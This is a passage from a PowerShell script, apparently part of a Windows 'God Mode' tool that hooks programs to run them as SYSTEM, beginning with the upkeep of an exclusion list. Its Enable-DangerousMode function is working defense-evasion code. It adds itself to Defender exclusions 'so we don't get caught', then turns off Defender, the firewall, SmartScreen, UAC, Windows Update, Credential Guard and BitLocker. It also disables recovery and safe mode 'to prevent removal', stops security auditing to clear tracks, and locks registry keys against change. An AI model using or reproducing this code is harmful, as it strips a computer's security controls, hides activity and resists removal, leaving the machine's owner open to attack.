    .DESCRIPTION
        15-second script-level cache ($script:GmAutoExcludeCache hashtable +
        $script:GmAutoExcludeCacheDt). The monitor's 15s periodic scan calls
        this once per process per scan, and without a cache each call re-reads
        the store file; the cache collapses N reads per scan to ~1 per 15s.
        Invalidated by Add-GmAutoExcludeEntries (sets both to $null so the next
        consult re-reads immediately). Fail-open preserved: a store error clears
        the cache (next call retries) and returns $false.
    .PARAMETER BaseName
        The target base name WITH extension (e.g. "notepad.exe"), matching the
        store line format "base|count|ts|excluded[|reason]". Case-insensitive.
    #>
    param([string]$BaseName)
    if (-not $BaseName) { return $false }
    $target = $BaseName.ToLower()
    try {
        $now = [DateTimeOffset]::Now
        if ($null -ne $script:GmAutoExcludeCache -and $null -ne $script:GmAutoExcludeCacheDt -and
            ($now - $script:GmAutoExcludeCacheDt).TotalSeconds -lt 15) {
            # 15s TTL: collapse N-per-scan store reads to ~1 per 15s. Add-GmAuto-
            # ExcludeEntries sets both to $null so a fresh write is seen at once.
            # Return the STORED VALUE (the excluded bool), NOT ContainsKey -- an
            # entry with excluded=0 (count < threshold) is in the cache with value
            # $false and must return $false (not yet excluded), so Detector B still
            # gets the 2nd SYSTEM attempt to reach threshold.
            if ($script:GmAutoExcludeCache.ContainsKey($target)) { return [bool]$script:GmAutoExcludeCache[$target] }
            return $false
        }
        if (-not (Test-Path $GodModeAutoExcludeFile)) {
            $script:GmAutoExcludeCache = @{}
            $script:GmAutoExcludeCacheDt = $now
            return $false
        }
        $lines = Get-Content -Path $GodModeAutoExcludeFile -ErrorAction SilentlyContinue
        $cache = @{}
        if ($lines) {
            foreach ($line in $lines) {
                if (-not $line) { continue }
                $parts = $line -split '\|'
                # 5th 'reason' field (C/G/P) is informational only -- excluded
                # is still parts[3]. Count -ge 4 keeps old 4-field lines working.
                if ($parts.Count -ge 4) {
                    $cache[$parts[0].ToLower()] = ($parts[3] -eq '1')
                }
            }
        }
        $script:GmAutoExcludeCache = $cache
        $script:GmAutoExcludeCacheDt = $now
        # Return the stored excluded bool for $target (the VALUE), not key existence:
        # an excluded=0 entry (count < threshold) stores $false and must return
        # $false so the monitor still attempts SYSTEM elevation (Detector B needs
        # the 2nd refusal to reach threshold). A base absent from the store -> $false.
        if ($cache.ContainsKey($target)) { return [bool]$cache[$target] }
        return $false
    } catch {
        # fail-open: store error -> clear the cache (retry next call) -> not excluded.
        $script:GmAutoExcludeCache = $null
        $script:GmAutoExcludeCacheDt = $null
        return $false
    }
}

function Add-GmAutoExcludeEntries {
    <#
    .SYNOPSIS
        Persist base names to the Detector B auto-exclude store at threshold
        (count=2, excluded=1) so gmproxy + gmhook + the monitor all treat them
        as excluded from the FIRST launch after enable. Called once by
        Install-IfeoElevation with the dropped BROWSER base names (UWP/AppX
        stay hooked -> try SYSTEM first -> Detector B catches refusals at
        runtime). Opens the same Global kernel mutex gmproxy.c uses
        (Global\GmProxyAutoExcludeMutex) so it cannot race a concurrent gmproxy
        launch mid-write; if the mutex does not exist yet (first install,
        gmproxy has not run), proceeds without it -- the atomic temp+rename is
        the real consistency guarantee, and no concurrent gmproxy can race us
        before the IFEO hooks are live. Fail-open: any error -> skip (never
        blocks the install).
    .PARAMETER BaseNames
        Array of base names WITH extension (e.g. "chrome.exe").
    .PARAMETER Reason
        Single reason char written as the 5th store field for NEW entries (and
        the fallback when an existing entry has no reason). Defaults to 'P'
        (PRE-DROP install-time browser drop). Install-IfeoElevation passes 'A'
        for AppX/Store-redirector stub drops (notepad/mspaint/calc/photos/...).
        An existing 5th-field reason is ALWAYS preserved on merge (a later
        install-time drop never overwrites a runtime C/G the store already
        learned). Informational only (Export-GodModeLogs legend).
    #>
    param([string[]]$BaseNames, [string]$Reason = 'P')
    if (-not $BaseNames -or $BaseNames.Count -eq 0) { return }
    try {
        if (-not (Test-Path $GodModeAutoExcludeDir)) {
            $null = New-Item -Path $GodModeAutoExcludeDir -ItemType Directory -Force -ErrorAction SilentlyContinue
        }
        # Cross-privilege mutex (same name as gmproxy.c). Try to open it; if it
        # does not exist yet (first install), proceed without -- the atomic
        # temp+rename write is the real consistency guarantee, and no concurrent
        # gmproxy can race us before the IFEO hooks are live.
        $mutex = $null
        $mutexName = "Global\GmProxyAutoExcludeMutex"
        $owned = $false
        try {
            $mutex = [System.Threading.Mutex]::OpenExisting($mutexName)
        } catch {
            # First-install window: gmproxy has not run yet so the Global mutex
            # does not exist. Create it (initiallyOwned=$false, then WaitOne) so
            # this write still serializes against a concurrent gmproxy that may
            # be starting in parallel -- closes the narrow race where two writers
            # (this installer + a just-launched gmproxy) both proceed without the
            # mutex. If create also fails (ACL/privilege), proceed without -- the
            # atomic temp+rename write is the real consistency guarantee, and no
            # concurrent gmproxy can race before the IFEO hooks are live.
            try { $mutex = New-Object System.Threading.Mutex($false, $mutexName) } catch { $mutex = $null }
        }
        if ($mutex) {
            try { $owned = $mutex.WaitOne(1000) } catch { $owned = $false }
        }
        try {
            # Load existing entries (skip bad lines, mirror gmproxy.c's parser).
            $existing = @{}
            if (Test-Path $GodModeAutoExcludeFile) {
                $lines = Get-Content -Path $GodModeAutoExcludeFile -ErrorAction SilentlyContinue
                if ($lines) {
                    foreach ($line in $lines) {
                        if (-not $line) { continue }
                        $parts = $line -split '\|'
                        if ($parts.Count -ge 4) {
                            $existing[$parts[0].ToLower()] = $line.Trim()
                        }
                    }
                }
            }
            # Merge: for each new name, write base|2|<now>|1 (threshold, excluded).
            # If the name already exists, keep the higher count and never downgrade
            # excluded (a later Detector B record only raises count and keeps
            # excluded=TRUE -- this helper never downgrades).
            $nowTs = [int64][DateTimeOffset]::Now.ToUnixTimeSeconds()
            foreach ($name in $BaseNames) {
                if (-not $name) { continue }
                $key = $name.ToLower()
                if ($existing.ContainsKey($key)) {
                    $parts = $existing[$key] -split '\|'
                    $cnt = 2; if ($parts.Count -ge 2) { $cnt = [int]$parts[1]; if ($cnt -lt 2) { $cnt = 2 } }
                    $excl = 1; if ($parts.Count -ge 4) { $excl = [int]$parts[3]; if ($excl -lt 1) { $excl = 1 } }
                    # Preserve an existing reason (5th field) if present; else the
                    # caller's $Reason (default 'P' browser, 'A' AppX stub). The
                    # reason is informational (Export-GodModeLogs legend).
                    $rsn = $Reason; if ($parts.Count -ge 5 -and $parts[4]) { $rsn = $parts[4] }
                    $existing[$key] = "$key|$cnt|$nowTs|$excl|$rsn"
                } else {
                    $existing[$key] = "$key|2|$nowTs|1|$Reason"
                }
            }
            # Atomic write (temp + Move-Item -Force, mirrors gmproxy.c's
            # MoveFileExW REPLACE_EXISTING).
            $tmp = "$GodModeAutoExcludeFile.tmp"
            $content = ($existing.Values | ForEach-Object { $_ }) -join "`n"
            if ($content) { $content += "`n" }
            Set-Content -Path $tmp -Value $content -Encoding UTF8 -ErrorAction SilentlyContinue
            if (Test-Path $tmp) {
                Move-Item -Path $tmp -Destination $GodModeAutoExcludeFile -Force -ErrorAction SilentlyContinue
            }
        } finally {
            # Invalidate the Test-GmAutoExcluded 15s cache so the next consult
            # re-reads the store immediately (this write may have added/changed
            # exclusions; without this a scan within 15s would miss the new entry).
            $script:GmAutoExcludeCache = $null
            $script:GmAutoExcludeCacheDt = $null
            if ($owned -and $mutex) { try { $mutex.ReleaseMutex() } catch {} }
            if ($mutex) { try { $mutex.Close() } catch {} }
        }
    } catch {
        Write-DebugLog -FunctionName "Add-GmAutoExcludeEntries" -Action "WARN" -Message "Failed: $_"
    }
}

function Reset-GmProxyAutoExcludeStore {
    <#
    .SYNOPSIS
        Clear the Detector B runtime SYSTEM-crash auto-exclude store (menu [18]).
        Calls gmproxy.exe --gm-reset-autoexclude (a mutex-safe reset that cannot
        race a concurrent gmproxy launch mid-write) when the deployed binary is
        available; falls back to deleting the store file directly. Best-effort.
        Detector A (AppX/browser drop at install time) is unaffected -- only the
        runtime crash learnings are cleared, so apps once again attempt SYSTEM
        elevation on their next launch.
    #>
    Write-DebugLog -FunctionName "Reset-GmProxyAutoExcludeStore" -Action "ENTRY"
    try {
        $GmProxyExe = Join-Path $GodModeInstallDir "gmproxy.exe"
        $reset = $false
        if (Test-Path $GmProxyExe) {
            try {
                $proc = Start-Process -FilePath $GmProxyExe -ArgumentList "--gm-reset-autoexclude" -NoNewWindow -Wait -PassThru -ErrorAction SilentlyContinue
                if ($proc -and $proc.ExitCode -eq 0) { $reset = $true }
            } catch {
                Write-DebugLog -FunctionName "Reset-GmProxyAutoExcludeStore" -Action "WARN" -Message "gmproxy --gm-reset-autoexclude failed: $_"
            }
        }
        if (-not $reset) {
            # Fallback: delete the file directly (best-effort; gmproxy's atomic
            # temp+rename means a concurrent write at worst re-creates it after).
            if (Test-Path $GodModeAutoExcludeFile) {
                Remove-Item -Path $GodModeAutoExcludeFile -Force -ErrorAction SilentlyContinue
            }
            $reset = $true
        }
        # Invalidate the Test-GmAutoExcluded 15s script cache so a monitor scan
        # right after this reset does not see stale exclusions for up to 15s
        # (the store file is gone, but the in-memory cache could still serve
        # the old excluded=1 entries until the TTL expires). Mirrors the
        # Add-GmAutoExcludeEntries finally-block invalidation.
        $script:GmAutoExcludeCache = $null
        $script:GmAutoExcludeCacheDt = $null
        if (Test-Path $GodModeAutoExcludeFile) {
            Write-Log -Message "Auto-exclude store reset FAILED (file still present at $GodModeAutoExcludeFile)." -Type "WARN" -Color Yellow
        } else {
            Write-Log -Message "Auto-exclude store reset. Apps will once again attempt SYSTEM elevation on their next launch (Detector A still drops AppX/browsers at install time)." -Type "INFO" -Color Green
        }
    } catch {
        Write-Log -Message "Reset-GmProxyAutoExcludeStore failed: $_" -Type "WARN" -Color Yellow
        Write-DebugLog -FunctionName "Reset-GmProxyAutoExcludeStore" -Action "ERROR" -Message "Outer catch: $_"
    }
    Write-DebugLog -FunctionName "Reset-GmProxyAutoExcludeStore" -Action "EXIT"
}

function Invoke-GmAutoExcludeReconcile {
    <#
    .SYNOPSIS
        Reconcile the Detector B auto-exclude store against the live system:
        drop orphaned install-time AppX/Store-redirector stub entries (reason
        'A') whose stub + alias no longer exist (the Store app was uninstalled),
        AND stale install-time browser entries (reason 'P') whose registered
        StartMenuInternet client vanished (the browser was uninstalled). Called
        from Start-Monitoring on a 5-minute cadence so the store stays tidy
        after a Store-app or browser uninstall instead of carrying a stale
        excluded=1 entry for up to 30 days. Never touches runtime C/G entries
        (those are governed by gmproxy.c's 30-day stale drop). Fail-open: any
        error -> skip; if the browser scan yields no clients (registry ACL
        denied), all 'P' entries are kept (cannot confirm the browser is gone).
        Cross-privilege mutex-safe (same Global\GmProxyAutoExcludeMutex as
        Add-GmAutoExcludeEntries + gmproxy.c) so it cannot race a concurrent
        gmproxy launch mid-write.
    #>
    Write-DebugLog -FunctionName "Invoke-GmAutoExcludeReconcile" -Action "ENTRY"
    try {
        if (-not (Test-Path $GodModeAutoExcludeFile)) { return }
        # Cross-privilege mutex (same name as gmproxy.c + Add-GmAutoExcludeEntries).
        $mutex = $null
        $mutexName = "Global\GmProxyAutoExcludeMutex"
        $owned = $false
        try { $mutex = [System.Threading.Mutex]::OpenExisting($mutexName) } catch {}
        if (-not $mutex) { try { $mutex = New-Object System.Threading.Mutex($false, $mutexName) } catch { $mutex = $null } }
        if ($mutex) { try { $owned = $mutex.WaitOne(1000) } catch { $owned = $false } }
        try {
            $lines = Get-Content -Path $GodModeAutoExcludeFile -ErrorAction SilentlyContinue
            if (-not $lines) { return }
            # Pre-build the set of App Execution Alias base names across ALL user
            # profiles -- an 'A' entry is orphaned only if the stub AND every
            # alias are gone (a surviving per-user alias means the Store app is
            # still installed for that user). Mirrors Get-GmSystemCompatExclusions'
            # WindowsApps reparse scan.
            $aliasBases = @{}
            try {
                if (Test-Path "C:\Users") {
                    Get-ChildItem -Path "C:\Users" -Directory -Force -ErrorAction SilentlyContinue | ForEach-Object {
                        try {
                            $ad = Join-Path $_.FullName "AppData\Local\Microsoft\WindowsApps"
                            if (-not (Test-Path $ad)) { return }
                            Get-ChildItem -Path $ad -Filter "*.exe" -Force -ErrorAction SilentlyContinue | ForEach-Object {
                                try { if ($_.Attributes.ToString() -match "ReparsePoint") { $aliasBases[$_.Name.ToLower()] = $true } } catch {}
                            }
                        } catch {}
                    }
                }
            } catch {}
            # Pre-build the registered-browser base-name set (StartMenuInternet
            # clients) so a 'P' entry whose browser was uninstalled is pruned.
            # Mirrors Get-GmSystemCompatExclusions' browser scan (registry-only,
            # cheap). Fail-open: any error -> empty set; the prune loop below
            # keeps all 'P' entries when $browserBases.Count -eq 0 (cannot
            # confirm the browser is gone -- next Enable re-scans).
            $browserBases = @{}
            try {
                $roots = @(
                    "HKLM:\SOFTWARE\Clients\StartMenuInternet",
                    "HKCU:\SOFTWARE\Clients\StartMenuInternet",
                    "HKLM:\SOFTWARE\WOW6432Node\Clients\StartMenuInternet"
                )
                foreach ($root in $roots) {
                    if (-not (Test-Path $root)) { continue }
                    try {
                        Get-ChildItem -Path $root -ErrorAction SilentlyContinue | ForEach-Object {
                            try {
                                $cmdKey = Join-Path $_.PSPath "shell\open\command"
                                if (-not (Test-Path $cmdKey)) { return }
                                $cmd = (Get-ItemProperty -Path $cmdKey -Name "(default)" -ErrorAction SilentlyContinue).'(default)'
                                if (-not $cmd) { return }
                                if ($cmd -match '"?([^"]+\.exe)') {
                                    $b = [System.IO.Path]::GetFileName($matches[1])
                                    if ($b) { $browserBases[$b.ToLower()] = $true }
                                }
                            } catch {}
                        }
                    } catch {}
                }
            } catch {}
            $kept = @()
            $dropped = 0
            foreach ($ln in $lines) {
                if (-not $ln) { continue }
                $p = $ln -split '\|'
                if ($p.Count -lt 4) { $kept += $ln; continue }
                $rsn = if ($p.Count -ge 5 -and $p[4]) { $p[4] } else { '?' }
                # Only prune install-time drops ('A' AppX/Store-stub + 'P'
                # browser). Runtime C/G entries are governed by gmproxy.c's
                # 30-day stale drop -- never prune them here.
                if ($rsn -ne 'A' -and $rsn -ne 'P') { $kept += $ln; continue }
                $base = $p[0]
                if ($rsn -eq 'A') {
                    # 'A' AppX/Store-stub: prune only if the stub AND every
                    # alias are gone (the Store app was uninstalled).
                    $stubExists = (Test-Path ("C:\Windows\" + $base)) -or (Test-Path ("C:\Windows\System32\" + $base))
                    $aliasExists = $aliasBases.ContainsKey($base.ToLower())
                    if ($stubExists -or $aliasExists) { $kept += $ln } else { $dropped++ }
                } else {
                    # 'P' browser: prune only if the registered StartMenuInternet
                    # client vanished (browser uninstalled). Fail-open: if the
                    # browser scan yielded NO clients (registry ACL denied / no
                    # browsers detected), keep all 'P' entries (cannot confirm
                    # the browser is gone -- next Enable re-scans).
                    if ($browserBases.Count -eq 0) { $kept += $ln }
                    elseif ($browserBases.ContainsKey($base.ToLower())) { $kept += $ln }
                    else { $dropped++ }
                }
            }
            if ($dropped -gt 0) {
                $tmp = "$GodModeAutoExcludeFile.tmp"
                $content = ($kept | ForEach-Object { $_ }) -join "`n"
                if ($content) { $content += "`n" }
                Set-Content -Path $tmp -Value $content -Encoding UTF8 -ErrorAction SilentlyContinue
                if (Test-Path $tmp) {
                    Move-Item -Path $tmp -Destination $GodModeAutoExcludeFile -Force -ErrorAction SilentlyContinue
                }
                # Invalidate the Test-GmAutoExcluded 15s cache so the next
                # consult re-reads the pruned store immediately.
                $script:GmAutoExcludeCache = $null
                $script:GmAutoExcludeCacheDt = $null
                Write-DebugLog -FunctionName "Invoke-GmAutoExcludeReconcile" -Action "INFO" -Message "Pruned $dropped orphaned 'A' AppX + 'P' browser entries (Store app / browser uninstalled)"
            }
        } finally {
            if ($owned -and $mutex) { try { $mutex.ReleaseMutex() } catch {} }
            if ($mutex) { try { $mutex.Close() } catch {} }
        }
    } catch {
        Write-DebugLog -FunctionName "Invoke-GmAutoExcludeReconcile" -Action "WARN" -Message "Failed: $_"
    }
    Write-DebugLog -FunctionName "Invoke-GmAutoExcludeReconcile" -Action "EXIT"
}

function Enable-DangerousMode {
    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "ENTRY"
    Write-Log -Message "Enabling dangerous mode..." -Type "WARN" -Color Yellow

    # 0. Add self to Defender exclusions BEFORE disabling it (so we don't get caught)
    Add-DefenderExclusion -Path $GodModeInstallDir
    Add-DefenderExclusion -Path $PSCommandPath

    # 1. Disable Tamper Protection (registry method, requires reboot on modern builds)
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -Value 0 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Tamper Protection and Real-Time registry overrides applied." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Could not fully disable tamper protection via registry: $_" -Type "WARN" -Color Yellow
    }

    # 2. Disable core Windows Defender user-mode services only (boot-critical drivers excluded)
    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc", "WaaSMedicSvc", "usosvc", "WerSvc", "DPS", "BITS", "NisSrv", "SgrmBroker")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $svc -Force -ErrorAction SilentlyContinue
            Write-Log -Message "Service $svc disabled and stopped." -Type "INFO" -Color Gray
        } catch { Write-Log -Message "Service $svc already down or inaccessible: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Disable MpPreference settings (requires tamper protection off)
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
            Write-Log -Message "Windows Defender MpPreference settings disabled." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "Set-MpPreference not available; MpPreference disable skipped." -Type "WARN" -Color Yellow
        }
    } catch {
        Write-Log -Message "Error setting MpPreference: $_" -Type "WARN" -Color Yellow
    }

    # 4. Disable Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "False" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Firewall disabled, SmartScreen disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 4a. Disable Safe Mode and Recovery to prevent removal
    Disable-RecoveryAndSafeMode

    # 4b. Suppress Security Center alerts
    Disable-SecurityAlerts

    # 5. Disable UAC / Admin Consent
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0 -Force
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0 -Force
        Write-Log -Message "UAC and Admin Consent prompts disabled." -Type "INFO" -Color Gray
    } catch {
        Write-Log -Message "Direct UAC disable failed: $_. Trying SYSTEM fallback..." -Type "WARN" -Color Yellow
        $UacFallback = "reg add `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`" /v EnableLUA /t REG_DWORD /d 0 /f & reg add `"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
        $UacResult = Invoke-AsSystem -Command $UacFallback
        if ($UacResult.Success) {
            Write-Log -Message "UAC disabled via SYSTEM fallback." -Type "INFO" -Color Gray
        } else {
            Write-Log -Message "SYSTEM fallback for UAC disable failed: $($UacResult.Output)" -Type "WARN" -Color Yellow
        }
    }

    # 6. Block Windows Update from re-enabling Defender
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -Value 1 -Force -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Disabled -ErrorAction SilentlyContinue
        Stop-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Windows Update service disabled." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error disabling Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Kill Defender processes
    try {
        Get-Process -Name MsMpEng, MsMpEngCP, smartscreen, SecurityHealthService, MpCmdRun, MsSense, MpDefenderCoreService, NisSrv, SgrmBroker, WerFault, WerFaultSecure, WaaSMedic, SecurityHealthSystray -ErrorAction SilentlyContinue |
            Stop-Process -Force -ErrorAction SilentlyContinue
        Write-Log -Message "Defender processes terminated." -Type "INFO" -Color Gray
    } catch { Write-Log -Message "Error killing defender processes: $_" -Type "WARN" -Color Yellow }

    # 8. Disable event logging and clear tracks
    Disable-SecurityAuditing

    # 9. NEW: Disable UAC prompts (silent elevation)
    Disable-UACPrompts

    # 10. NEW: Disable SmartScreen via registry
    Disable-SmartScreenRegistry

    # 11. NEW: Disable Remote UAC (full admin tokens over network)
    Disable-RemoteUAC

    # 12. NEW: Disable Credential Guard / VBS
    Disable-CredentialGuard

    # 13. NEW: Disable Windows Script Host
    Disable-WindowsScriptHost

    # 14. NEW: Broader security subsystem disable
    Disable-AppLocker
    Disable-WindowsSandbox
    Disable-LSAProtection
    Disable-ASR
    Disable-ControlledFolderAccess
    Disable-ExploitGuard
    Disable-BitLocker

    # Harden God Mode registry keys to prevent tampering
    Write-Log -Message "Hardening God Mode registry keys against tampering..." -Type "INFO" -Color Yellow
    $GodModeRegistryKeys = @(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications",
        "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
        "SOFTWARE\Policies\Microsoft\Windows\System",
        "SOFTWARE\Microsoft\Windows Script Host\Settings",
        "SOFTWARE\Microsoft\Windows Defender\Features"
    )
    foreach ($Key in $GodModeRegistryKeys) {
        $null = Harden-RegistryKey -Path $Key
    }
    Write-DebugLog -FunctionName "Enable-DangerousMode" -Action "EXIT" -Message "Complete"
}

function Disable-DangerousMode {
    Write-DebugLog -FunctionName "Disable-DangerousMode" -Action "ENTRY"
    Write-Log -Message "Disabling dangerous mode..." -Type "WARN" -Color Yellow

    # Restore God Mode registry ACLs before attempting to remove values
    Write-Log -Message "Restoring God Mode registry ACLs..." -Type "INFO" -Color Yellow
    $GodModeRegistryKeys = @(
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System",
        "SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection",
        "SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications",
        "SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU",
        "SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer",
        "SOFTWARE\Policies\Microsoft\Windows\System",
        "SOFTWARE\Microsoft\Windows Script Host\Settings",
        "SOFTWARE\Microsoft\Windows Defender\Features"
    )
    foreach ($Key in $GodModeRegistryKeys) {
        $null = Restore-RegistryKey -Path $Key
    }

    # 1. Restore Tamper Protection registry
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Name "TamperProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring tamper protection registry: $_" -Type "WARN" -Color Yellow }

    # 2. Restore Defender services
    $DefenderServices = @("WinDefend", "WdNisSvc", "wscsvc", "SecurityHealthService", "Sense", "MDCoreSvc", "WaaSMedicSvc", "usosvc", "WerSvc", "DPS", "BITS", "NisSrv", "SgrmBroker")
    foreach ($svc in $DefenderServices) {
        try {
            Set-Service -Name $svc -StartupType Automatic -ErrorAction SilentlyContinue
            Start-Service -Name $svc -ErrorAction SilentlyContinue
        } catch { Write-Log -Message "Could not restore service $svc`: $_" -Type "WARN" -Color Yellow }
    }

    # 3. Restore MpPreference
    try {
        if (Get-Command Set-MpPreference -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableBlockAtFirstSeen $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisablePrivacyMode $false -ErrorAction SilentlyContinue
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableArchiveScanning $false -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIntrusionPreventionSystem $false -ErrorAction SilentlyContinue
        } else {
            Write-Log -Message "Set-MpPreference not available; MpPreference restore skipped." -Type "WARN" -Color Yellow
        }
    } catch { Write-Log -Message "Error restoring MpPreference: $_" -Type "WARN" -Color Yellow }

    # 4. Restore Firewall and SmartScreen
    try {
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled "True" -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "On" -Force -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring firewall/smartscreen: $_" -Type "WARN" -Color Yellow }

    # 5. Restore UAC
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 1 -Force
    } catch { Write-Log -Message "Error restoring UAC: $_" -Type "WARN" -Color Yellow }

    # 6. Restore Windows Update
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name "NoAutoUpdate" -ErrorAction SilentlyContinue
        Set-Service -Name "wuauserv" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "wuauserv" -ErrorAction SilentlyContinue
    } catch { Write-Log -Message "Error restoring Windows Update: $_" -Type "WARN" -Color Yellow }

    # 7. Restart WinDefend
    try { Start-Service -Name WinDefend -ErrorAction SilentlyContinue } catch { Write-Log -Message "Could not restart WinDefend: $_" -Type "WARN" -Color Yellow }

    # 8. Restore Safe Mode and Recovery
    # BCD/WinRE modifications removed to prevent boot-level conflicts in VirtualBox
    Write-Log -Message "BCD/WinRE restore skipped (boot-safe mode)." -Type "INFO" -Color Gray

    # 9. Restore Security Center alerts
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" -Name "HideSCAHealth" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableNotifications" -ErrorAction SilentlyContinue
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" -Name "DisableEnhancedNotifications" -ErrorAction SilentlyContinue
    } catch {}

    # 10. Restore ELAM
    try {
        Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DriverLoadPolicy" -ErrorAction SilentlyContinue
    } catch {}

    # 11. Restore event logging
    try {
        Set-Service -Name "EventLog" -StartupType Automatic -ErrorAction SilentlyContinue
        Start-Service -Name "EventLog" -ErrorAction SilentlyContinue
    } catch {}

    # 12. NEW: Restore UAC prompts
    try {
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 5 -Force -ErrorAction SilentlyContinue
        Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "PromptOnSecureDesktop" -Value 1 -Force -ErrorAction SilentlyContinue
    } catch {}

    # 13. NEW: Restore SmartScreen
    try {
        Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
